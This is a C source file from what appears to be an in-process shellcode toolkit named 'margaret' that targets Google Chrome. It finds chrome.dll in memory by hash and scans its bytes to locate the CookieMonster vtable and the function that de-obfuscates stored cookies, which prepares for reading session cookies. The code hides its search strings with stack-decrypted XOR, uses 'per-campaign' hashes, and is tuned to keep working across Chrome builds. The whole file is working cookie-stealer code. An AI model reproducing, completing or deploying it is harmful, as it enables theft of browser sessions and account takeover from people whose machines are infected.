#define PIC_CODE_SECTION_NAME ".text$E"
#include "chromium_adapter.h"
#include "pic_needles.h"
#include "margaret.h"
/*
 * Chromium adapter — runtime discovery only.
 *
 * The vtable and the ProcessBound de-obfuscator are located by byte-
 * pattern chains on the live module; no per-build table ships in the
 * blob.  Selection fails closed: a build whose shape the chains cannot
 * prove selects nothing, never "almost works".
 */

/* FNV-1a 32-bit of L"chrome.dll" with the a-z -> A-Z fold (pic_resolve.h
 * hash rules).  Derived offline; scripts/hash.py will generate the table
 * when the crypto-hygiene hardening lands. */
/* per-campaign dual-32 hash (scripts/hash.py --emit) */

static PIC_CODE pic_u16 adapter_read_u16(const pic_u8 *data)
{
    return (pic_u16)((pic_u16)data[0] | ((pic_u16)data[1] << 8u));
}

static PIC_CODE pic_u32 adapter_read_u32(const pic_u8 *data)
{
    return (pic_u32)((pic_u32)data[0] |
                     ((pic_u32)data[1] << 8u) |
                     ((pic_u32)data[2] << 16u) |
                     ((pic_u32)data[3] << 24u));
}

static PIC_CODE pic_u64 adapter_read_u64(const pic_u8 *data)
{
    return (pic_u64)adapter_read_u32(data) |
           ((pic_u64)adapter_read_u32(data + 4) << 32u);
}

/*
 * Minimal PE header validation returning SizeOfImage (0 on any failure).
 * Same checks as pic_validate_image in resolve.c, reduced to the one
 * field this TU needs; byte-wise reads, no aligned struct pointers.
 */
static PIC_CODE pic_u32 adapter_image_size(const pic_u8 *base)
{
    pic_u32 lfanew;

    if (adapter_read_u16(base) != PIC_IMAGE_DOS_SIGNATURE) {
        return 0u;
    }
    lfanew = adapter_read_u32(
        base + (pic_u32)PIC_OFFSETOF(PIC_IMAGE_DOS_HEADER, e_lfanew));
    if (lfanew < (pic_u32)sizeof(PIC_IMAGE_DOS_HEADER) ||
        lfanew > 0x1000u - (pic_u32)sizeof(PIC_IMAGE_NT_HEADERS64) ||
        (lfanew & 3u) != 0u) {
        return 0u;
    }
    if (adapter_read_u32(base + lfanew) != PIC_IMAGE_NT_SIGNATURE) {
        return 0u;
    }
    if (adapter_read_u16(base + lfanew + 0x04u) !=
        PIC_IMAGE_FILE_MACHINE_AMD64) {
        return 0u;
    }
    if (adapter_read_u16(base + lfanew + 0x18u) !=
        PIC_IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return 0u;
    }
    return adapter_read_u32(base + lfanew + 0x18u + 0x38u);
}

/* Chained-XOR used to decrypt the compile-time-encrypted needles
 * (scripts/gen_needles.py) onto the stack. */
static PIC_CODE void adapter_chained_xor(pic_u8 *dst, const pic_u8 *src,
                                         pic_u32 len, pic_u8 key)
{
    pic_u32 i;

    for (i = 0u; i < len; i++) {
        pic_u8 c = src[i];
        dst[i] = (pic_u8)(c ^ key);
        key = (pic_u8)(key + c + (pic_u8)i);
    }
}

/* Cross-build runtime discovery (the only selection path).
 * Chains validated on 8 builds 152->154 with four PDB ground truths and
 * one live extraction (docs/adapter-field-154.0.8037.md); every gate
 * fails closed on ambiguity.
 *  1. deobfuscator: masked scan for the Value() call shape (cmp
 *     [reg+0x108],imm | access [reg+0xE0] | call rel32), majority vote
 *     on the target, junk gate on its prologue;
 *  2. vtable: needle in .rdata -> unique lea xref -> that function is
 *     slot[3] of the CookieMonster vtable (order PDB-verified). */

#define DISCOVERY_MAX_TARGETS 8u
#define DISCOVERY_MIN_VOTES   3u
#define DISCOVERY_WINDOW      56u

/* section-name needles (encrypted; decrypted on stack per call) */
static const pic_u8 *adapter_section_name(const pic_u8 *enc,
                                          pic_u8 *stack8)
{
    adapter_chained_xor(stack8, enc, 8u, (pic_u8)MARGARET_NEEDLE_XOR_KEY);
    return stack8;
}

/* RVA + size of a section by exact 8-byte name; byte-wise header walk. */
static PIC_CODE pic_bool adapter_section_range(const pic_u8 *base,
                                               const pic_u8 *name8,
                                               pic_u32 *out_rva,
                                               pic_u32 *out_size)
{
    pic_u32 lfanew;
    pic_u16 nsec;
    pic_u16 opt;
    pic_u32 table;
    pic_u16 i;

    if (base == PIC_NULL || name8 == PIC_NULL) {
        return PIC_FALSE;
    }
    lfanew = adapter_read_u32(base + 0x3Cu);
    if (lfanew < (pic_u32)sizeof(PIC_IMAGE_DOS_HEADER) ||
        lfanew > 0x1000u - (pic_u32)sizeof(PIC_IMAGE_NT_HEADERS64) ||
        (lfanew & 3u) != 0u) {
        return PIC_FALSE;
    }
    nsec = adapter_read_u16(base + lfanew + 0x06u);
    opt = adapter_read_u16(base + lfanew + 0x14u);
    if (nsec == 0u || nsec > 96u) {
        return PIC_FALSE;
    }
    table = lfanew + 0x18u + (pic_u32)opt;
    for (i = 0u; i < nsec; i++) {
        const pic_u8 *s = base + table + (pic_u32)i * 40u;
        pic_bool eq = PIC_TRUE;
        pic_u32 k;
        for (k = 0u; k < 8u; k++) {
            if (s[k] != name8[k]) {
                eq = PIC_FALSE;
                break;
            }
        }
        if (eq) {
            pic_u32 vsize = adapter_read_u32(s + 0x08u);
            pic_u32 va = adapter_read_u32(s + 0x0Cu);
            if (va == 0u || vsize == 0u) {
                return PIC_FALSE;
            }
            *out_rva = va;
            *out_size = vsize;
            return PIC_TRUE;
        }
    }
    return PIC_FALSE;
}

/* bounded naive search; first byte is selective enough for our needles */
static PIC_CODE const pic_u8 *adapter_find_bytes(
    const pic_u8 *hay, pic_u32 hay_len,
    const pic_u8 *needle, pic_u32 needle_len)
{
    pic_u32 i;

    if (needle_len == 0u || hay_len < needle_len) {
        return PIC_NULL;
    }
    for (i = 0u; i + needle_len <= hay_len; i++) {
        pic_u32 j = 0u;
        while (j < needle_len && hay[i + j] == needle[j]) {
            j++;
        }
        if (j == needle_len) {
            return hay + i;
        }
    }
    return PIC_NULL;
}

/* Chain 1: majority target of the masked Value() call shape. */
static PIC_CODE pic_bool adapter_discover_deobfuscator(
    const pic_u8 *base, pic_u32 text_rva, pic_u32 text_size,
    pic_u32 *out_deobf_rva)
{
    struct DISCOVERY_TALLY {
        pic_u32 rva;
        pic_u32 count;
    } tally[DISCOVERY_MAX_TARGETS];
    pic_u32 used = 0u;
    const pic_u8 *tx = base + text_rva;
    pic_u32 off;

    for (off = 0u; off + 4u <= text_size; off++) {
        pic_u32 base_off;
        const pic_u8 *w;
        pic_u32 wlen;
        pic_bool e0;
        pic_u32 j;

        if (tx[off] != 0x08u || tx[off + 1u] != 0x01u ||
            tx[off + 2u] != 0x00u || tx[off + 3u] != 0x00u) {
            continue;
        }
        /* prefix forms: [80 B8-BF] or [41 80 B0-B7] before the disp32 */
        if (off >= 2u && tx[off - 2u] == 0x80u &&
            tx[off - 1u] >= 0xB8u && tx[off - 1u] <= 0xBFu) {
            base_off = off - 2u;
        } else if (off >= 3u && tx[off - 3u] == 0x41u &&
                   tx[off - 2u] == 0x80u &&
                   tx[off - 1u] >= 0xB0u && tx[off - 1u] <= 0xB7u) {
            base_off = off - 3u;
        } else {
            continue;
        }
        w = tx + base_off;
        wlen = DISCOVERY_WINDOW;
        if (wlen > text_size - base_off) {
            wlen = text_size - base_off;
        }
        /* access to +0xE0: lea rcx,[reg+0xE0] or add rcx,0xE0 */
        e0 = PIC_FALSE;
        for (j = 7u; j + 7u <= wlen; j++) {
            if (w[j] == 0x48u && w[j + 1u] == 0x8Du &&
                w[j + 2u] >= 0x88u && w[j + 2u] <= 0x8Fu &&
                w[j + 2u] != 0x8Cu &&
                w[j + 3u] == 0xE0u && w[j + 4u] == 0x00u &&
                w[j + 5u] == 0x00u && w[j + 6u] == 0x00u) {
                e0 = PIC_TRUE;
                break;
            }
            if (w[j] == 0x48u && w[j + 1u] == 0x81u &&
                w[j + 2u] == 0xC1u &&
                w[j + 3u] == 0xE0u && w[j + 4u] == 0x00u &&
                w[j + 5u] == 0x00u && w[j + 6u] == 0x00u) {
                e0 = PIC_TRUE;
                break;
            }
            if (w[j] == 0x48u && w[j + 1u] == 0x83u &&
                w[j + 2u] == 0xC1u && w[j + 3u] == 0xE0u) {
                e0 = PIC_TRUE;
                break;
            }
        }
        if (!e0) {
            continue;
        }
        /* call rel32 inside the window */
        for (j = 10u; j + 5u <= wlen && j < 51u; j++) {
            if (w[j] == 0xE8u) {
                pic_i32 rel = (pic_i32)adapter_read_u32(w + j + 1u);
                pic_u32 tgt = text_rva + base_off + j + 5u +
                              (pic_u32)rel;
                if (tgt >= text_rva && tgt < text_rva + text_size) {
                    pic_u32 t;
                    pic_bool seen = PIC_FALSE;
                    for (t = 0u; t < used; t++) {
                        if (tally[t].rva == tgt) {
                            tally[t].count++;
                            seen = PIC_TRUE;
                            break;
                        }
                    }
                    if (!seen && used < DISCOVERY_MAX_TARGETS) {
                        tally[used].rva = tgt;
                        tally[used].count = 1u;
                        used++;
                    }
                }
                break;
            }
        }
    }

    /* winner: strict majority, enough votes, sane prologue */
    {
        pic_u32 best = 0u, second = 0u;
        pic_u32 i;
        for (i = 0u; i < used; i++) {
            if (tally[i].count > best) {
                second = best;
                best = tally[i].count;
            } else if (tally[i].count > second) {
                second = tally[i].count;
            }
        }
        if (best < DISCOVERY_MIN_VOTES || best <= second) {
            return PIC_FALSE;
        }
        for (i = 0u; i < used; i++) {
            if (tally[i].count == best) {
                const pic_u8 *fn = base + tally[i].rva;
                /* family prologue gate: the real Value() opens with
                 * push r15/r14/r13/r12 (41 57 41 56 41 55 41 54).
                 * Replaces the old first-byte ret/int3 junk filter,
                 * which any non-stub wrong winner passed.  The call
                 * target was validated inside .text when tallied, so
                 * fn[0..7] cannot leave the mapped section. */
                if (fn[0] != 0x41u || fn[1] != 0x57u ||
                    fn[2] != 0x41u || fn[3] != 0x56u ||
                    fn[4] != 0x41u || fn[5] != 0x55u ||
                    fn[6] != 0x41u || fn[7] != 0x54u) {
                    return PIC_FALSE; /* wrong prologue: not Value() */
                }
                *out_deobf_rva = tally[i].rva;
                return PIC_TRUE;
            }
        }
    }
    return PIC_FALSE;
}

/* Chain 2: needle -> unique lea xref -> function start = vtable slot[3]
 * -> vtable = slot address - 24 (slot order constant 152 -> 154). */
static PIC_CODE pic_bool adapter_discover_vtable(
    const pic_u8 *base, pic_u64 base_va,
    pic_u32 text_rva, pic_u32 text_size,
    pic_u32 rd_rva, pic_u32 rd_size,
    pic_u32 *out_vt_rva)
{
    pic_u8 needle[MARGARET_NEEDLE_BUF];
    const pic_u8 *rd = base + rd_rva;
    const pic_u8 *tx = base + text_rva;
    const pic_u8 *hit;
    pic_u32 str_rva;
    pic_u32 lea_off = 0u;
    pic_u32 lea_count = 0u;
    pic_u32 off;
    pic_u32 k;

    adapter_chained_xor(needle, margaret_needle_getcookielist,
                        MARGARET_NEEDLE_BUF,
                        (pic_u8)MARGARET_NEEDLE_XOR_KEY);
    hit = adapter_find_bytes(rd, rd_size, needle,
                             MARGARET_NEEDLE_GETCOOKIELIST_LEN + 1u);
    if (hit == PIC_NULL) {
        return PIC_FALSE;
    }
    str_rva = rd_rva + (pic_u32)(hit - rd);

    /* unique rip-relative lea xref to the string */
    for (off = 0u; off + 7u <= text_size; off++) {
        const pic_u8 *p = tx + off;
        pic_u32 m;
        if (p[0] != 0x48u && p[0] != 0x4Cu) {
            continue;
        }
        if (p[1] != 0x8Du) {
            continue;
        }
        m = p[2];
        if ((m & 0xC7u) != 0x05u) {
            continue;
        }
        if (text_rva + off + 7u +
                (pic_u32)(pic_i32)adapter_read_u32(p + 3) == str_rva) {
            lea_off = off;
            lea_count++;
            if (lea_count > 1u) {
                return PIC_FALSE; /* ambiguous: fail closed */
            }
        }
    }
    if (lea_count != 1u) {
        return PIC_FALSE;
    }

    /* candidate function starts: 16-aligned, descending from the lea,
     * within 0x400 (function start is close below the lea site) */
    for (k = 0u; k < 64u; k++) {
        pic_u32 start = lea_off & ~0xFu;
        pic_u32 cand;
        pic_u8 pat[8];
        pic_u64 want_va;
        const pic_u8 *q;

        if (k * 16u > start) {
            break;
        }
        cand = start - k * 16u;
        if (cand > lea_off) {
            break;
        }
        want_va = base_va + (pic_u64)(text_rva + cand);
        pat[0] = (pic_u8)(want_va & 0xFFu);
        pat[1] = (pic_u8)((want_va >> 8u) & 0xFFu);
        pat[2] = (pic_u8)((want_va >> 16u) & 0xFFu);
        pat[3] = (pic_u8)((want_va >> 24u) & 0xFFu);
        pat[4] = (pic_u8)((want_va >> 32u) & 0xFFu);
        pat[5] = (pic_u8)((want_va >> 40u) & 0xFFu);
        pat[6] = (pic_u8)((want_va >> 48u) & 0xFFu);
        pat[7] = (pic_u8)((want_va >> 56u) & 0xFFu);

        q = rd;
        for (;;) {
            pic_u32 ko;
            q = adapter_find_bytes(q, (pic_u32)((rd + rd_size) - q),
                                   pat, 8u);
            if (q == PIC_NULL) {
                break;
            }
            ko = (pic_u32)(q - rd);
            /* slot[3] hypothesis: vtable = ko - 24; slots 0..2 and the
             * slot after must be relocated code pointers in .text */
            if (ko >= 24u + 8u && ko + 8u + 8u <= rd_size) {
                pic_u32 s;
                pic_bool ok = PIC_TRUE;
                for (s = 0u; s < 3u; s++) {
                    pic_u64 v = adapter_read_u64(q - 24u + s * 8u);
                    if (v < base_va ||
                        v - base_va < (pic_u64)text_rva ||
                        v - base_va >= (pic_u64)(text_rva + text_size)) {
                        ok = PIC_FALSE;
                        break;
                    }
                }
                if (ok) {
                    pic_u64 v = adapter_read_u64(q + 8u);
                    if (!(v >= base_va &&
                          v - base_va >= (pic_u64)text_rva &&
                          v - base_va < (pic_u64)(text_rva + text_size))) {
                        ok = PIC_FALSE;
                    }
                }
                if (ok) {
                    *out_vt_rva = rd_rva + ko - 24u;
                    return PIC_TRUE;
                }
            }
            q += 1u;
        }
    }
    return PIC_FALSE;
}
/* Runtime discovery of both Engine A anchors (chain A vtable via the
 * string needle in .rdata, chain B de-obfuscator via the masked code
 * shape in .text).  Fail-closed: any gate that does not hold aborts
 * the whole selection.  adapter_version = 2 marks a discovered table. */
static PIC_CODE pic_bool adapter_discover(
    MARGARET_CHROMIUM_ADAPTER *out_adapter, const pic_u8 *base,
    pic_u64 base_va, pic_u32 image_size)
{
    pic_u32 text_rva, text_size, rd_rva, rd_size;
    pic_u32 vt_rva, deobf_rva;
    pic_u8 secn[8];
    pic_u8 secr[8];

    if (!adapter_section_range(base,
                               adapter_section_name(margaret_needle_sectext, secn),
                               &text_rva, &text_size) ||
        !adapter_section_range(base,
                               adapter_section_name(margaret_needle_secrdata, secr),
                               &rd_rva, &rd_size) ||
        !adapter_discover_deobfuscator(base, text_rva, text_size,
                                       &deobf_rva) ||
        !adapter_discover_vtable(base, base_va, text_rva, text_size,
                                 rd_rva, rd_size, &vt_rva)) {
        return PIC_FALSE;
    }
    {
        pic_u64 slot0 = adapter_read_u64(base + vt_rva);
        if (slot0 < base_va ||
            slot0 - base_va >= (pic_u64)image_size) {
            return PIC_FALSE;
        }
        (void)margaret_memzero(out_adapter, (pic_size)sizeof(*out_adapter));
        out_adapter->adapter_version = 2u;
        out_adapter->product = MARGARET_CHROMIUM_PRODUCT_CHROME;
        out_adapter->image_size = image_size;
        out_adapter->rva_cookie_monster_vtable = vt_rva;
        out_adapter->rva_canonical_cookie_deobfuscator = deobf_rva;
        /* slot[4] = GetAllCookiesAsync (informational) */
        {
            pic_u64 s4 = adapter_read_u64(base + vt_rva + 32u);
            if (s4 >= base_va && s4 - base_va < (pic_u64)image_size) {
                out_adapter->rva_cookie_monster_get_all_cookies =
                    (pic_u32)(s4 - base_va);
            }
        }
        return PIC_TRUE;
    }
}

PIC_CODE pic_bool PIC_MS_ABI
margaret_select_chromium_adapter(void *chrome_base, pic_u32 image_size,
                                  MARGARET_CHROMIUM_ADAPTER *out_adapter)
{
    const pic_u8 *base = (const pic_u8 *)chrome_base;
    pic_u64 base_va;

    if (base == PIC_NULL || out_adapter == PIC_NULL) {
        return PIC_FALSE;
    }
    base_va = (pic_u64)(pic_uptr)base;

    /* Runtime discovery only: every build is located by its own
     * bytes, never by a per-build table.  Fail-closed gates (majority
     * vote, junk filter, vtable slot sanity) make a wrong answer
     * impossible by construction; failure means UNSUPPORTED_BUILD. */
    return adapter_discover(out_adapter, base, base_va, image_size);
}

PIC_CODE pic_bool PIC_MS_ABI margaret_locate_chrome_dll(PIC_CONTEXT *ctx,
                                                         void **chrome_base,
                                                         pic_u32 *image_size)
{
    void *base;
    pic_u32 size;

    if (ctx == PIC_NULL || chrome_base == PIC_NULL || image_size == PIC_NULL) {
        return PIC_FALSE;
    }
    {
        PIC_HASH chrome_hash = MARGARET_MODULE_HASH_CHROME_DLL;
        if (pic_find_module(ctx, &chrome_hash, &base) != PIC_RESOLVE_OK) {
            return PIC_FALSE;
        }
    }
    size = adapter_image_size((const pic_u8 *)base);
    if (size == 0u) {
        return PIC_FALSE;
    }
    *chrome_base = base;
    *image_size = size;
    return PIC_TRUE;
}
